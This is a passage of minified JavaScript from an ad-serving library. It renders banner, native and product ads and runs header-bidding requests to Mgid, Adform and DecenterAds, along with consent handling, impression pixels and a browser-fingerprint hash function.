        s = this.track.rhtmlspecialchars(t.headline2).trim(),
        a = this.track.rhtmlspecialchars(t.description).trim(),
        o = this.track.rhtmlspecialchars(t.cta),
        d = "//fimg-resp.seznam.cz/?spec=fav16x16&url=" + encodeURIComponent(t.adUrl),
        c = !0 === this.definition.test ? t.adUrl ? t.adUrl : this.track.noquerystring("//seznam.cz") : t.clickUrl;
      if (0 !== t.adImageUrl.length) {
        i = t.adImageUrl + "?fl=res%2C160%2C110%2C3|jpg%2C90", r = t.adImageUrl + "?fl=res%2C560%2C260%2C3|jpg%2C90";
        var h = t.adImageUrl + "?fl=res%2C600%2C%2C1|jpg%2C90";
        e.addScreenshot(i, 160, 110, i), e.addScreenshot(r, 560, 260, r), e.addScreenshot(h, 600, 314, h);
      } else e.addScreenshot(i, 160, 110, i), e.addScreenshot(r, 280, 130, r);
      return e.addText(n, a), s && (0 !== t.adImageUrl.length || e.addText(n + " - " + s, a)), e.setClickUrl(c), e.setVisibleUrl(t.visibleUrl), e.setAdUrl(t.adUrl), e.setCta(o), e.setFavicon(d), e.done(), e;
    },
    createTextAdOld: function (t) {
      var e = new AdTrack.TextAd(),
        i = "//fimg-resp.seznam.cz/?spec=ft100x75&fast&url=" + encodeURIComponent(t.adUrl),
        r = "//fimg-resp.seznam.cz/?spec=ft280x130&fast&url=" + encodeURIComponent(t.adUrl),
        n = (encodeURIComponent(t.adUrl), this.track.rhtmlspecialchars(t.creative1).trim()),
        s = this.track.rhtmlspecialchars(t.creative2).trim(),
        a = this.track.rhtmlspecialchars(t.creative3).trim(),
        o = this.track.rhtmlspecialchars(t.cta),
        d = "//fimg-resp.seznam.cz/?spec=fav16x16&url=" + encodeURIComponent(t.adUrl),
        c = !0 === this.definition.test ? t.adUrl ? t.adUrl : this.track.noquerystring("//seznam.cz") : t.clickUrl;
      return e.addScreenshot(i, 100, 75, i), e.addScreenshot(r, 280, 130, r), e.addText(n, s + " " + a), e.setClickUrl(c), e.setVisibleUrl(t.visibleUrl), e.setAdUrl(t.adUrl), e.setCta(o), e.setFavicon(d), e.done(), e;
    },
    createProductAd: function (t, e, i) {
      var r = new AdTrack.ProductAd(),
        n = i.options.imageWidth || this.definition.options.imageWidth || null,
        s = i.options.imageHeight || this.definition.options.imageHeight || null;
      n && s || (n = 220, s = 120);
      var a = t.imageUrl + "?w=" + n + "&h=" + s + "&m=rp",
        o = t.imageUrl + "?w=220&h=120&m=rp";
      i && i.options && i.options.backgroundImage && (a = t.imageUrl, o = t.imageUrl);
      var d = e && e.cleanShopUrl ? "https://fimg-resp.seznam.cz/?spec=fav16x16&url=" + encodeURIComponent(e.cleanShopUrl) : "",
        c = !0 === this.definition.test ? t.adUrl ? t.adUrl : this.track.noquerystring("//seznam.cz") : t.clickUrl,
        h = t.price;
      return h.match(/[0-9]$/) && (h += "&nbsp;Kč"), h = h.replace(/[ ]+/g, "&nbsp;"), r.addScreenshot(a, n, s, o), r.setProductName(t.title), r.setProductPrice(h), r.setProductCondition(t.condition), r.setAdditionalInfo(t.additionalInfo), r.setProductManufacturer(t.manufacturer), r.setProductCategory(t.category), r.setClickUrl(c), r.setFavicon(d), r.done(), r;
    },
    createShop: function (t) {
      var e = new AdTrack.Shop(),
        i = t.cleanShopUrl,
        r = i.split("//");
      return r.length > 1 ? e.setCleanShopUrl(r[1]) : e.setCleanShopUrl(i), e.setShopName(t.shopName), e.setShopSlogan(t.shopSlogan), e.setShopUrl(t.shopUrl), e.setShopLogo(t.shopLogoUrl), e.setLogoutUrl(""), e;
    },
    isProductAd: function (t) {
      return t.length > 0 && ("DRTG" == t[0].adType || "SHOP" == t[0].adType);
    },
    isBanner: function (t) {
      return t.length > 0 && (t[0].isBanner || "BANNER" == t[0].adType);
    },
    isBranding: function (t) {
      return t.length > 0 && "BRANDING" == t[0].adType;
    },
    renderBanner: function (t, e) {
      var i = function (t) {
          var i = this.chd.width,
            r = this.chd.height;
          t.width && t.height ? (i = t.width, r = t.height) : "classic_cnn.iprima.cz_generic_970x210" !== this.track.unitID.getName() && "classic_cnn.iprima.cz_generic_300x600_1" !== this.track.unitID.getName() || console.log(arguments, "load handle"), s.data.width = i, s.data.height = r, s.data.style = {
            count: e.count,
            name: "banner",
            options: {
              width: s.data.width,
              height: s.data.height
            }
          }, s.loaded();
        }.bind(this),
        r = function (e) {
          var r = this.definition.test ? this.track.noquerystring("//seznam.cz") : t.clickUrl,
            n = this.track.document.createElement("div");
          n.style.textAlign = "center", n.style.fontSize = "0";
          var a = this.track.document.createElement("div");
          a.style.display = "inline-block", a.style.position = "relative", a.style.margin = "auto", n.appendChild(a), e.appendChild(n);
          var o = this.track.document.createElement("a");
          this.definition.options.hideHref ? o.href = "#" : o.href = r, a.appendChild(o);
          var d,
            c,
            h,
            l = this.track.document.createElement("img");
          if (l.src = t.bannerUrl, l.style.width = "auto", l.style.height = "auto", l.style.border = "solid 1px #d0d0d0", o.appendChild(l), o.onclick = (d = 0, c = "banner", h = r, function (t) {
            var i = AdTrack.Utils.getEventRelativePos(t, e);
            s.clicked(i.x, i.y, d, c), this.definition.options.newwindow || (t.preventDefault ? t.preventDefault() : t.returnValue = !1, !1 === AdTrack.Utils.redirect(h) && this.track.doError("Cant redirect (seznam)"));
          }).bind(this), this.definition.options.newwindow ? o.setAttribute("target", "_blank") : o.setAttribute("target", "_top"), !this.definition.options.noBannerPromo && ("sklik" == this.chd.tag || "sklik-banner" == this.chd.tag)) {
            var u = this.track.document.createElement("a");
            u.style.position = "absolute", u.style.bottom = "0px", u.style.right = "0px", u.style.background = "transparent", u.href = this.chd.url;
            var p = this.track.document.createElement("img");
            p.alt = p.title = this.chd.title, p.style.width = "auto", p.style.height = "auto", u.appendChild(p);
            var f = function () {
              p.src = "//c.seznam.cz/img/banner-packa.png";
            };
            u.onmouseover = function () {
              p.src = "//c.seznam.cz/img/banner-logo.png";
            }, u.onmouseout = f, f(), a.appendChild(u);
          }
          l.complete ? i(l) : (l.onload = function (t) {
            i(t.target);
          }, l.onerror = function () {
            s.error();
          });
        }.bind(this),
        n = {
          chd: this.chd,
          width: 1,
          height: 1,
          fluid: !0,
          ad: {
            data: r,
            type: "function"
          },
          preload: {
            timeout: 15e3
          },
          impTrackers: this.impPixels
        },
        s = new AdTrack.MediaTypes.Banner(n, this.track.errorReporting);
      return s;
    },
    renderBranding: function (t, e, i) {
      var r = "";
      r = t[0].brandingUrl && "" !== t[0].brandingUrl ? t[0].brandingUrl : t[0].bannerUrl, t[0] && t[0].eventTrackers && t[0].eventTrackers.impress && (this.impPixels = this.impPixels.concat(t[0].eventTrackers.impress));
      var n = '<a href="' + t[0].clickUrl + '" target="_top"><img src="' + r + '"/></a>';
      return this.renderInIFrame(n, e, i);
    },
    renderInIFrame: function (t, e, i) {
      var r = {
        chd: this.chd,
        width: e,
        height: i,
        ad: {
          data: "<html><head></head><body>" + t + "</body></html>",
          type: "content"
        },
        impTrackers: this.impPixels
      };
      return new AdTrack.MediaTypes.Banner(r, this.track.errorReporting);
    },
    renderIFrameFromURL: function (t, e, i) {
      var r = {
        chd: this.chd,
        width: e,
        height: i,
        ad: {
          data: '<iframe width="' + e + '" height="' + i + '" src="' + t + '"></iframe>',
          type: "iframe"
        },
        impTrackers: this.impPixels
      };
      return new AdTrack.MediaTypes.Banner(r, this.track.errorReporting);
    },
    computeHash: function () {
      var t,
        e,
        i = [];
      for (e in screen) i.push(screen[e]);
      if (navigator.plugins && navigator.plugins.length) for (t = 0; t < navigator.plugins.length; t++) {
        var r = navigator.plugins[t];
        i.push(r.description), i.push(r.filename);
        for (var n = 0; n < r.length; n++) {
          var s = r[n];
          i.push(s.description), i.push(s.suffixes), i.push(s.type);
        }
      } else if (window.ActiveXObject) {
        var a,
          o,
          d = {
            "AcroPDF.PDF": function () {
              return this.GetVersions();
            },
            "PDF.PdfCtrl": function () {
              return this.GetVersions();
            },
            "ShockwaveFlash.ShockwaveFlash": function () {
              return this.GetVariable("$version");
            },
            "QuickTime.QuickTime": function () {
              return this.QuickTimeVersion;
            },
            "rmocx.RealPlayer G2 Control": function () {
              return this.GetVersionInfo();
            },
            "rmocx.RealPlayer G2 Control.1": function () {
              return this.GetVersionInfo();
            },
            "RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)": function () {
              return this.GetVersionInfo();
            },
            "RealVideo.Rep.CalVideo(tm) ActiveX Control (32-bit)": function () {
              return this.GetVersionInfo();
            },
            RealPlayer: function () {
              return this.GetVersionInfo();
            },
            "WMPlayer.OCX": function () {
              return this.versionInfo;
            },
            "AgControl.AgControl": function () {
              return (this.IsVersionSupported("3.0") ? "3" : this.IsVersionSupported("2.0") && "2") || this.IsVersionSupported("1.0") && "1";
            },
            "VideoLAN.VLCPlugin": function () {
              return this.VersionInfo;
            }
          };
        for (e in d) {
          try {
            a = new ActiveXObject(e), i.push(e);
          } catch (t) {
            continue;
          }
          try {
            o = d[e].call(a), i.push(o);
          } catch (t) {
            i.push("[unavail]");
          }
        }
      }
      var c = i.join("").toLowerCase(),
        h = [0, 0, 0, 0],
        l = 0;
      for (t = 0; t < c.length; t++) h[l] = (h[l] + c.charCodeAt(t)) % 65535, l = (l + 1) % h.length;
      return h.join("");
    },
    generatePvId: function () {
      var t = new Date();
      t = t.toUTCString();
      var e = document.location.href,
        i = Math.random().toString();
      return this.calculatePvId(t + e + i);
    },
    calculatePvId: function (t) {
      for (var e = 2166136261, i = 0, r = t.length; i < r; i++) {
        e = 16777619 * (e ^= 255 & t.charCodeAt(i)) | 0;
      }
      return Math.abs(e).toString();
    },
    isValidHttpUrl: function (t) {
      var e;
      try {
        e = new URL(t);
      } catch (t) {
        return -1 !== navigator.appVersion.indexOf("MSIE 10");
      }
      return "http:" === e.protocol || "https:" === e.protocol;
    }
  };
}, function (t, e) {
  AdTrack.MgidHelper = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i;
  }, AdTrack.MgidHelper.prototype = {
    bid: function (t, e, i, r) {
      var n = AdTrack.Config.getAccountId("mgid");
      if (n) {
        var s = AdTrack.Utils.getLocalStorageItem("mgMuidn"),
          a = "https://prebid.mgid.com/prebid/" + n;
        null != s && "string" == typeof s && s.length > 0 && (a += "?muid=" + s);
        var o = this.createData(e, i),
          d = this;
        AdTrack.Ajax.request({
          label: "Mgid bid",
          url: a,
          method: "POST",
          data: JSON.stringify(o),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.chd.timeout || 800,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this)
        }, this.track.errorReporting).done(function (e) {
          e && e.ext && e.ext.muidn && AdTrack.Utils.setLocalStorageItem("mgMuidn", e.ext.muidn);
          var i = null;
          if (e && e.seatbid && e.seatbid[0] && e.seatbid[0].bid && e.seatbid[0].bid[0]) {
            var n = e.seatbid[0].bid[0];
            i = AdTrack.Price.create(n.price, AdTrack.Price.USD), t.setCreativeId(n.crid), t.setPrice(i), t.setWidth(n.w ? n.w : d.chd.width), t.setHeight(n.h ? n.h : d.chd.height);
          }
          d.response = e, r && r(i, e);
        }).fail(function (t, e) {
          e ? d.track.evBidTimeout(d.definition, d.chd) : d.track.evBidError(d.definition, d.chd), r && r(null, null);
        }).send();
      } else this.track.doError("MGID accountId not defined. " + this.chd.tag);
    },
    createData: function (t, e) {
      var i = AdTrack.Utils.simpleStringGenerator(14),
        r = AdTrack.Utils.simpleStringGenerator(14),
        n = "https:" === window.location.protocol ? 1 : 0,
        s = "";
      try {
        s = AdTrack.Utils.getDomainName(window.top.location.hostname);
      } catch (t) {
        s = AdTrack.Utils.getDomainName(window.location.hostname);
      }
      var a = {
        id: i,
        tagid: t + "/r2b2Placement",
        secure: n
      };
      if (e) {
        a.native = {
          request: {
            plcmtcnt: 1,
            assets: [{
              required: 1,
              id: 2,
              img: {
                wmin: 600,
                hmin: 314,
                w: 600,
                h: 314,
                type: 3
              }
            }, {
              required: 0,
              id: 3,
              img: {
                wmin: 16,
                hmin: 16,
                w: 16,
                h: 16,
                type: 1
              }
            }, {
              required: 1,
              id: 1,
              title: {
                len: 300
              }
            }, {
              required: 1,
              id: 5,
              data: {
                type: 2
              }
            }, {
              required: 1,
              id: 4,
              data: {
                type: 1
              }
            }, {
              required: 0,
              id: 9,
              data: {
                type: 12
              }
            }]
          }
        }, this.chd.bidFloor && (a.bidfloor = this.chd.bidFloor, a.bidfloorcur = this.chd.currency);
      } else {
        var o = this.chd.sizes,
          d = [];
        if (d.push({
          w: this.chd.width,
          h: this.chd.height
        }), o && o.length > 0) for (var c = 0; c < o.length; c++) 2 === o[c].length && d.push({
          w: o[c][0],
          h: o[c][1]
        });
        a.banner = {
          w: this.chd.width,
          h: this.chd.height,
          format: d
        };
      }
      var h = {
          ua: navigator.userAgent,
          js: 1,
          dnt: AdTrack.Utils.getDNT() ? 1 : 0,
          h: screen.height,
          w: screen.width,
          language: AdTrack.Utils.getLanguage(!0)
        },
        l = {
          dnt: h.dnt,
          language: h.language,
          ua: h.ua,
          w: window.innerWidth,
          h: window.innerHeight
        },
        u = {
          domain: s,
          page: AdTrack.url,
          ref: AdTrack.Utils.getReferrer()
        },
        p = {
          domain: u.domain,
          page: u.page,
          publisher: {
            domain: u.domain
          },
          ref: u.ref
        };
      let f = {
        id: r,
        cur: [this.chd.currency],
        device: h,
        site: u,
        geo: {
          utcoffset: new Date().getTimezoneOffset()
        },
        ext: {
          prebid_ver: "7.40.0",
          mgid_ver: "1.5",
          device: l,
          site: p
        },
        imp: [a]
      };
      var g = !1,
        m = !1,
        k = null;
      if (AdTrack.CMP && (k = AdTrack.CMP.getConsentData()), k) {
        g = !0;
        var b = {},
          v = {};
        b.ext = {
          consent: k.consentString ? k.consentString : ""
        }, v.ext = {
          gdpr: k.gdprApplies ? 1 : 0
        }, f.ext.regs = v, f.regs = v, f.ext.user = b, f.user = b;
      }
      var A = null;
      return AdTrack.USP && (A = AdTrack.USP.getConsentData()), A && A.consentString && (m = !0, f.ext || (f.ext = {}), f.ext.us_privacy = A.consentString), (g || m) && this.track.evBidConsent(this.definition, this.chd, g, m), f;
    }
  };
}, function (t, e) {
  AdTrack.AdformNativeDSPChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.MTsupport = !0;
  }, AdTrack.AdformNativeDSPChannel.prototype = {
    bid: function (t, e) {
      var i = this.createData(e),
        r = this;
      AdTrack.Ajax.request({
        label: "Adform native bid",
        url: "//adx.adform.net/adx/openrtb",
        method: "POST",
        data: JSON.stringify(i),
        json: !0,
        async: !this.definition.options.noAsync,
        headers: {},
        timeout: this.chd.timeout || 800,
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (e) {
        if (e && e.seatbid && e.seatbid[0] && e.seatbid[0].bid && e.seatbid[0].bid[0]) {
          var i = e.seatbid[0].bid[0];
          r.isBidValid(i) ? r.price = AdTrack.Price.create(i.price, AdTrack.Price.EUR) : r.price = null;
        } else r.price = null;
        r.response = e, t && t(r.price, e);
      }).fail(function (e, i) {
        i ? r.track.evBidTimeout(r.definition, r.chd) : r.track.evBidError(r.definition, r.chd), r.price = null, t && t(null, null);
      }).send();
    },
    isBidValid: function (t) {
      var e = this.parseAssets(AdTrack.Utils.deepAccess(t, "native.assets"));
      if (!e.title || !e.description || !e.image || "object" != typeof e.image) return this.track.doError("Adform didnt provide either text or image."), !1;
      var i = e.image.width,
        r = e.image.height;
      return !!(i >= 100 && r >= 100 && i / r >= 1) || (this.track.doError("Adform native - image has invalid dimension [" + i + ", " + r + "]", "debug"), !1);
    },
    isAdValidForRender: function (t, e) {
      var i = e ? e.options.nativeOptions : this.definition.options.nativeOptions,
        r = t.title.length,
        n = t.description.length,
        s = t.image.width,
        a = t.image.height,
        o = s / a;
      if (i) {
        var d = i.maxTitleLength || i.maxTextLength,
          c = i.maxDescLength || i.maxTextLength;
        if (r > 80 && !d) return this.track.doError("Adform native - possible title overflow (" + r + "), style: " + e.name, "debug"), !1;
        if (n > 150 && !c) return this.track.doError("Adform native - possible description overflow (" + n + "), style: " + e.name, "debug"), !1;
        if (i.imgWidth && i.imgHeight) {
          var h = i.imgWidth,
            l = i.imgHeight,
            u = h / l;
          if (!(u < 1.5 ? o >= u / 1.1 && o <= u / .9 : o >= u / 1.15 && o <= u / .85)) return this.track.doError("Adform native - image not optimal, img [" + s + ", " + a + "], optimal [" + h + ", " + l + "], style: " + e.name, "debug"), !1;
        }
      } else this.track.doError("No native options included, style: " + e.name);
      return !0;
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e ? e.normal : null);
      if (r) {
        var n = function (r) {
          if (r && r.seatbid && r.seatbid[0] && r.seatbid[0].bid && r.seatbid[0].bid[0]) {
            var n = r.seatbid[0].bid[0],
              s = this.processResult(n, t, e ? e.normal : null);
            s ? i(s) : this.track.passback(this.definition, this.chd);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    parseAssets: function (t) {
      var e = {};
      try {
        t.forEach(function (t) {
          var i = {
              0: "title",
              1: "data",
              2: "img",
              3: "img",
              4: "data",
              5: "data"
            }[t.id],
            r = {
              0: "title",
              1: "cta",
              2: "favicon",
              3: "image",
              4: "description",
              5: "advertiser"
            }[t.id],
            n = t[i];
          n && (e[r] = n.text || n.value || {
            url: n.url,
            width: n.w,
            height: n.h
          });
        });
      } catch (t) {}
      return e;
    },
    processResult: function (t, e, i) {
      var r = t ? t.native : null;
      if (!r || !r.assets || !r.link) return !1;
      var n = new AdTrack.AdSet();
      n.setStyle(i);
      var s = new AdTrack.AdChoices();
      s.setPromoClickUrl(this.chd.url), s.setPromoText(this.chd.title), s.setOptional(!0), n.addAdChoices(s);
      var a = new AdTrack.TextAd(),
        o = r.link,
        d = r.imptrackers || void 0,
        c = this.parseAssets(r.assets);
      if (!this.isAdValidForRender(c, i)) return !1;
      var h = c.image,
        l = c.favicon;
      a.addText(c.title, c.description), h && a.addScreenshot(h.url, h.width, h.height, h.url);
      var u = c.advertiser ? c.advertiser : "",
        p = "";
      l && l.url && (p = l.url);
      var f = !0 === this.definition.test ? "" : o.url;
      a.setClickUrl(f), a.setVisibleUrl(""), a.setAdUrl(""), a.setCta(c.cta), a.setFavicon(p), a.setCompanyName(u), a.done(), n.addAd(new AdTrack.AdformAd(n, a));
      var g = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
        m = {
          chd: this.chd,
          ad: {
            type: "tcproxy",
            data: {
              adSet: n,
              tc: g
            }
          },
          style: i,
          count: 1,
          impTrackers: d
        };
      return new AdTrack.MediaTypes.Native(m, this.track.errorReporting);
    },
    createData: function (t) {
      var e = AdTrack.Utils.uuid(),
        i = AdTrack.Utils.uuid(),
        r = {},
        n = {},
        s = null;
      AdTrack.CMP && (s = AdTrack.CMP.getConsentData()), s && (this.track.evBidConsent(this.definition, this.chd, !0), r.ext = {
        consent: s.consentString ? s.consentString : ""
      }, n.ext = {
        gdpr: s.gdprApplies ? 1 : 0
      });
      var a = {
          id: e,
          cur: ["EUR"],
          device: {
            ua: navigator.userAgent
          },
          site: {
            page: AdTrack.url
          },
          ext: {},
          imp: [{
            id: Math.floor(1e6 * Math.random()),
            tagid: "" + t,
            native: {
              request: {
                assets: [{
                  required: 1,
                  id: 3,
                  img: {
                    wmin: 1,
                    hmin: 1,
                    type: 3
                  }
                }, {
                  required: 0,
                  id: 2,
                  img: {
                    wmin: 1,
                    hmin: 1,
                    type: 1
                  }
                }, {
                  required: 1,
                  id: 0,
                  title: {
                    len: 300
                  }
                }, {
                  required: 1,
                  id: 4,
                  data: {
                    type: 2
                  }
                }, {
                  required: 0,
                  id: 5,
                  data: {
                    type: 1
                  }
                }, {
                  required: 0,
                  id: 1,
                  data: {
                    type: 12
                  }
                }]
              }
            }
          }],
          source: {
            tid: i,
            fd: 1
          },
          user: r,
          regs: n
        },
        o = this.track.getSupplyChain();
      return o && (a.source.ext = {
        schain: o
      }), a;
    }
  };
}, function (t, e) {
  AdTrack.AdformHbbtvChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.adformUtils = new AdTrack._AdFormUtils(), this.price = null, this.response = null, this.helper = new AdTrack.AdformHelper(t, e, i), this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.AdformHbbtvChannel.prototype = {
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.OUTDOOR, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      e = e && e.normal ? e.normal : null;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = AdTrack.Utils.objectValues(this.definition.options.blackListedBNs),
          s = function (t) {
            var s,
              a = t && t[0];
            if (a && a.outdoor) {
              this.helper.isBlacklisted(a.outdoor.url, n) && (a.outdoor.clk = null);
              var o = function (t) {
                  if (!this.definition.options.dom.noContainer) {
                    if (null !== a.outdoor.clk) {
                      var i = this.track.window.document.createElement("a");
                      if (this.definition.options.clickProxy) {
                        var n = (window.location && "https:" === window.location.protocol ? "https:" : "http:") + "//" + this.track.server + "/clickProxy.php?" + AdTrack.Utils.uri("url", a.outdoor.clk) + "&" + AdTrack.Utils.uri("u", AdTrack.url) + "&" + AdTrack.Utils.uri("key", r) + "&" + AdTrack.Utils.uri("style", e.name) + "&" + this.track.reportMethod.doP(this.definition, this.chd);
                        i.setAttribute("href", n);
                      } else i.setAttribute("href", a.outdoor.clk), AdTrack.Utils.setOnclick([i], function (t) {
                        this.track.evClick(this.definition, this.chd, void 0, null, null, null, null, e);
                      }.bind(this), this.definition.options.newwindow);
                      t.appendChild(i);
                    }
                    s.loaded();
                  }
                }.bind(this),
                d = {
                  chd: this.chd,
                  width: this.chd.width,
                  height: this.chd.height,
                  ad: {
                    data: o,
                    type: "function"
                  },
                  externalRender: !0,
                  impTrackers: [a.outdoor.imp]
                };
              (s = new AdTrack.MediaTypes.Banner(d, this.track.errorReporting)).passResponse(t), i(s);
            } else this.chd.html5 && a && "banner" === a.response ? (s = this.adformRender(a), i(s)) : this.track.passback(this.definition, this.chd);
          }.bind(this);
        this.price && this.response ? s(this.response) : this.bid(function (t, e) {
          s(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    adformRender: function (t) {
      this.chd.width = t.width, this.chd.height = t.height;
      var e = {
        chd: this.chd,
        width: this.chd.width,
        height: this.chd.height,
        ad: {},
        wrapAd: "AdTrackIframeWrap"
      };
      return t.banner.match(/^<iframe/i) ? (e.ad.data = t.banner, e.ad.type = "iframe") : (e.ad.data = "<html><head><script>window.inDapIF=true;<\/script></head><body>" + t.banner + "</body></html>", e.ad.type = "content"), new AdTrack.MediaTypes.Banner(e, this.track.errorReporting);
    }
  };
}, function (t, e) {
  var i;
  AdTrack.DecenterAdsHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, this.track.shouldCsync("decenterads") && setTimeout(function () {
      AdTrack.DecenterAdsHBCSync();
    }.bind(this), 5e3);
  }, AdTrack.DecenterAdsHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      let i = AdTrack.Utils.windowTopAccess() || window;
      var r = {
          deviceWidth: screen.width,
          deviceHeight: screen.height,
          language: AdTrack.Utils.getLanguage(),
          secure: AdTrack.Utils.isSecure(AdTrack.url) ? 1 : 0,
          host: i.location.host,
          page: i.location.pathname,
          ua: navigator.userAgent,
          placements: []
        },
        n = !1,
        s = !1,
        a = null;
      AdTrack.CMP && (a = AdTrack.CMP.getConsentData()), a && a.consentString && (n = !0, r.gdpr = a.gdprApplies ? 1 : 0, r.gdpr_consent = a.consentString);
      var o = null;
      AdTrack.USP && (o = AdTrack.USP), o && o.consentString && (s = !0, r.ccpa = o.consentString), (n || s) && this.track.evBidConsent(this.definition, this.chd, n, s), r.placements.push({
        placementId: Number(e),
        bidId: AdTrack.Utils.randomString("adtrack"),
        traffic: "banner"
      });
      var d = function (e) {
          if (this.response = e, e && e[0]) {
            var i = e[0];
            i.currency && i.currency === AdTrack.Price.USD ? i.cpm ? (this.price = AdTrack.Price.create(i.cpm, AdTrack.Price.USD), this.bidResponse.setPrice(this.price), this.bidResponse.setCreativeId(i.creativeId), i.width && i.height ? (this.bidResponse.setWidth(i.width || this.chd.width), this.bidResponse.setHeight(i.height || this.chd.height), t && t(this.price, this.response)) : (this.track.doError("Channel " + this.chd.tag + " - dimensions missing."), t && t(null, null))) : (this.track.doError("Channel " + this.chd.tag + " - price missing or null."), t && t(null, null)) : (this.track.doError("Channel " + this.chd.tag + " responded with wrong currency: " + i.currency), t && t(null, null));
          } else t && t(null, null);
        }.bind(this),
        c = function (e, i) {
          i ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, t && t(null, null);
        }.bind(this);
      AdTrack.Ajax.request({
        label: "DecenterAds bid",
        url: "https://supply.decenterads.com/?c=o&m=multi",
        method: "POST",
        async: !this.definition.options.noAsync,
        json: !0,
        timeout: this.chd.timeout || 800,
        data: JSON.stringify(r),
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (t) {
        d(t);
      }).fail(function (t, e) {
        c(t, e);
      }).send();
    },
    render: function (t, e, i) {
      this.container = t, e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t[0] && t[0].ad) {
            var e = {
              chd: this.chd,
              width: this.bidResponse.getDimension().width,
              height: this.bidResponse.getDimension().height,
              ad: {
                data: "<html><head></head><body>" + t[0].ad + "</body></html>",
                type: "content"
              }
            };
            this.adData = e.ad.data;
            var r = new AdTrack.MediaTypes.Banner(e, this.track.errorReporting);
            r.on("load", function () {
              var e = r.getElement();
              e && AdTrack.Utils.addEvent(e, "load", function () {
                e.contentDocument.querySelectorAll("img:not([src])").length > 0 && this.track.doError("[" + this.chd.tag + "] Empty creative: '" + t[0].creativeId + "'", "debug");
              }.bind(this));
            }.bind(this)), i(r);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  }, AdTrack.DecenterAdsHBCSync = AdTrack.DecenterAdsHBCSync || (i = !1, function () {
    i || (new Image().src = "https://supply.decenterads.com/?c=o&m=cookie", i = !0);
  });
}, function (t, e) {
  AdTrack.MgidHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.helper = new AdTrack.MgidHelper(t, e, i), this.MTsupport = !0;
  }, AdTrack.MgidHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, !1, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0]) {
            var e = t.seatbid[0].bid[0],
              r = e.price.toFixed(2);
            "" != e.nurl && (e.nurl = e.nurl.replace(/\$\{AUCTION_PRICE\}/, r), new Image().src = e.nurl), "string" == typeof e.burl && e.burl.length > 0 && (e.adm = e.adm.replace(/\$\{AUCTION_PRICE\}/, r)), this.adData = e.adm, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height;
            var n = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: e.adm,
                  type: "content"
                }
              },
              s = new AdTrack.MediaTypes.Banner(n, this.track.errorReporting);
            i(s);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  AdTrack.MgidHBNativeChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.helper = new AdTrack.MgidHelper(t, e, i), this.MTsupport = !0;
  }, AdTrack.MgidHBNativeChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, !0, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (r) {
          if (r && r.seatbid && r.seatbid[0] && r.seatbid[0].bid && r.seatbid[0].bid[0]) {
            var n = r.seatbid[0].bid[0],
              s = n.price.toFixed(2);
            "" != n.nurl && (n.nurl = n.nurl.replace(/\$\{AUCTION_PRICE\}/, s), new Image().src = n.nurl), "string" == typeof n.burl && n.burl.length > 0 && (n.adm = n.adm.replace(/\$\{AUCTION_PRICE\}/, s)), this.adData = n;
            try {
              var a = JSON.parse(n.adm),
                o = this.processResult(a, t, e ? e.normal : null);
              o ? i(o) : this.track.passback(this.definition, this.chd);
            } catch (t) {
              this.track.doError("mgid native - " + t.message, "debug"), this.track.passback(this.definition, this.chd);
            }
